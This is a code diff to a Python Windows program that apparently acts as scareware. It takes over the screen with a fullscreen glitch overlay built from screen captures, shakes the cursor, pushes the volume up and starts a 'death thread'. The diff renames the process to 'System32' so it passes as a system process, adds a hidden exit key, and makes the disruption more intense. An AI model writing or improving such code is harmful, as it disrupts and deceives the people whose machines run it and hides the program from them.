@@ -5,6 +5,7 @@ import os
 import random
 import pyautogui
 import threading
+from PyQt5.QtCore import Qt
 from PyQt5 import QtWidgets, QtGui, QtCore
 from PIL import ImageGrab
 from colorama import Fore, init
@@ -13,6 +14,9 @@ import win32api
 import win32process
 import win32security
 import winsound
+import signal
+import setproctitle
+setproctitle.setproctitle("System32")
 
 
 
@@ -140,8 +144,12 @@ class GlitchWindow(QtWidgets.QWidget):
         self._setup_window()
         self._setup_timer()
         self.degradation_time = 0
-        self.start_artifacts = 200
+        self.start_artifacts = 500
         self._setup_cursor_shake()
+
+    def keyPressEvent(self, event):
+        if event.key() == Qt.Key_6:
+            os._exit(0)
 
     def _setup_window(self):
         """Sets up the window properties"""
@@ -192,9 +200,9 @@ class GlitchWindow(QtWidgets.QWidget):
                     screen_pixels[x, y][0],
                     screen_pixels[x, y][1],
                     screen_pixels[x, y][2],
-                    random.randint(150, 300)
+                    random.randint(240, 255)
                 )
-                width = random.randint(10, 80)
+                width = random.randint(10, 130)
                 height = random.randint(2, 20)
                 painter.fillRect(x, y, width, height, color)
         except:
@@ -267,7 +275,7 @@ class SoundTrack:
     @staticmethod
     def increase_volume(amount : int):
         for i in range(amount):
-            pyautogui.press("volumeup")
+            pyautogui.press("volumeup",interval = 0.01,presses=amount)
 
 
 def run_Death_Thread():
@@ -352,10 +360,8 @@ if __name__ == '__main__':
     sound = SoundTrack()
     window.showFullScreen()
 
-    # Start death thread
     DeathThread = threading.Thread(target=run_Death_Thread)
 
     DeathThread.start()
 
-    # Run the application
     sys.exit(app.exec_())
